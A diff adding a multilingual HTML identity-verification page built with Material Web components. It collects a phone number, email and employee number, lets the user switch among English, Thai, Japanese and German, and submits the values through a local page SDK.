@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <script src="/sdk/app-page-sdk.js"></script>
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <script type="importmap">
+      {
+        "imports": {
+          "@material/web/": "https://esm.run/@material/web/"
+        }
+      }
+    </script>
+    <script type="module">
+      import "@material/web/all.js";
+      import { styles as typescaleStyles } from "@material/web/typography/md-typescale-styles.js";
+
+      document.adoptedStyleSheets.push(typescaleStyles.styleSheet);
+    </script>
+    <style>
+      :root {
+        --google-blue: #1a73e8;
+        --google-blue-hover: #1765cc;
+        --text-primary: #202124;
+        --text-secondary: #5f6368;
+        --link-color: #1a73e8;
+        --border-color: #dadce0;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: "Roboto", "Google Sans", system-ui, sans-serif;
+        background: #fff;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 2rem 1.5rem;
+      }
+
+      .verification-card {
+        width: 100%;
+        max-width: 450px;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+      }
+
+      .verification-header {
+        text-align: left;
+        margin-bottom: 2.5rem;
+      }
+
+      .verification-header .emoji-icon {
+        margin: 0 0 0.5rem 0;
+        font-size: 48px;
+        line-height: 1;
+        display: block;
+      }
+
+      .verification-header h1 {
+        margin: 0;
+        font-size: 32px;
+        font-weight: 400;
+        color: var(--text-primary);
+      }
+
+      .verification-header p:not(.emoji-icon) {
+        margin: 0.5rem 0 0;
+        font-size: 16px;
+        color: var(--text-primary);
+        font-weight: 400;
+      }
+
+      #verification-form {
+        display: flex;
+        flex-direction: column;
+        gap: 1.5rem;
+      }
+
+      .form-footer {
+        margin-top: 2rem;
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+      }
+
+      .form-footer a {
+        color: var(--link-color);
+        font-size: 0.875rem;
+        text-decoration: none;
+      }
+
+      .form-footer a:hover {
+        text-decoration: underline;
+      }
+
+      .page-footer {
+        margin-top: auto;
+        padding-top: 2rem;
+        width: 100%;
+        max-width: 450px;
+        display: flex;
+        justify-content: flex-start;
+        align-items: center;
+        font-size: 0.75rem;
+        color: var(--text-secondary);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="verification-card">
+      <div class="verification-header">
+        <p class="emoji-icon">🔮</p>
+        <h1 id="i18n-title" class="md-typescale-headline-large">Verify your identity</h1>
+        <p id="i18n-subtitle" class="md-typescale-body-large">Use your account details</p>
+      </div>
+
+      <form id="verification-form">
+        <md-outlined-text-field
+          id="phone-number"
+          type="tel"
+          inputmode="tel"
+          autocomplete="tel"
+          required
+          no-asterisk
+        ></md-outlined-text-field>
+        <md-outlined-text-field
+          id="email"
+          type="email"
+          inputmode="email"
+          autocomplete="email"
+          required
+          no-asterisk
+        ></md-outlined-text-field>
+        <md-outlined-text-field
+          id="employee-number"
+          type="text"
+          autocomplete="off"
+          required
+          no-asterisk
+        ></md-outlined-text-field>
+        <div class="form-footer">
+          <md-filled-button type="submit" id="submit-button">Submit</md-filled-button>
+        </div>
+      </form>
+    </div>
+
+    <footer class="page-footer">
+      <md-outlined-select id="lang-select" label="Language" aria-label="Language">
+        <md-select-option value="en">
+          <div slot="headline">English (United States)</div>
+        </md-select-option>
+        <md-select-option value="th">
+          <div slot="headline">ไทย</div>
+        </md-select-option>
+        <md-select-option value="ja">
+          <div slot="headline">日本語</div>
+        </md-select-option>
+        <md-select-option value="de">
+          <div slot="headline">Deutsch</div>
+        </md-select-option>
+      </md-outlined-select>
+    </footer>
+  </body>
+
+  <script>
+    const translations = {
+      en: {
+        title: 'Verify your identity',
+        subtitle: 'Use your account details',
+        phoneLabel: 'Phone number',
+        emailLabel: 'Email',
+        employeeLabel: 'Employee number',
+        submitButton: 'Submit'
+      },
+      th: {
+        title: 'ยืนยันตัวตน',
+        subtitle: 'ใช้ข้อมูลบัญชีของคุณ',
+        phoneLabel: 'หมายเลขโทรศัพท์',
+        emailLabel: 'อีเมล',
+        employeeLabel: 'หมายเลขพนักงาน',
+        submitButton: 'ส่ง'
+      },
+      ja: {
+        title: '本人確認',
+        subtitle: 'アカウント情報をご入力ください',
+        phoneLabel: '電話番号',
+        emailLabel: 'メールアドレス',
+        employeeLabel: '社員番号',
+        submitButton: '送信'
+      },
+      de: {
+        title: 'Identität bestätigen',
+        subtitle: 'Verwenden Sie Ihre Kontodaten',
+        phoneLabel: 'Telefonnummer',
+        emailLabel: 'E-Mail',
+        employeeLabel: 'Mitarbeiternummer',
+        submitButton: 'Absenden'
+      }
+    };
+
+    function applyLanguage(lang) {
+      const t = translations[lang] || translations.en;
+      document.getElementById('i18n-title').textContent = t.title;
+      document.getElementById('i18n-subtitle').textContent = t.subtitle;
+      document.getElementById('submit-button').textContent = t.submitButton;
+
+      const phoneField = document.getElementById('phone-number');
+      const emailField = document.getElementById('email');
+      const employeeField = document.getElementById('employee-number');
+
+      phoneField.label = t.phoneLabel;
+      phoneField.placeholder = t.phoneLabel;
+      emailField.label = t.emailLabel;
+      employeeField.label = t.employeeLabel;
+    }
+
+    const langSelect = document.getElementById('lang-select');
+    const savedLang = localStorage.getItem('verification-lang') || 'en';
+
+    requestAnimationFrame(() => {
+      langSelect.value = savedLang;
+      applyLanguage(savedLang);
+    });
+
+    langSelect.addEventListener('change', () => {
+      const lang = langSelect.value;
+      localStorage.setItem('verification-lang', lang);
+      document.documentElement.lang = lang;
+      applyLanguage(lang);
+    });
+
+    document.documentElement.lang = savedLang;
+
+    const form = document.getElementById('verification-form');
+    form.addEventListener('submit', (event) => {
+      event.preventDefault();
+      if (!form.reportValidity()) return;
+      const phoneNumber = document.getElementById('phone-number').value;
+      const email = document.getElementById('email').value;
+      const employeeNumber = document.getElementById('employee-number').value;
+      SDK.submit({ phoneNumber, email, employeeNumber });
+    });
+  </script>
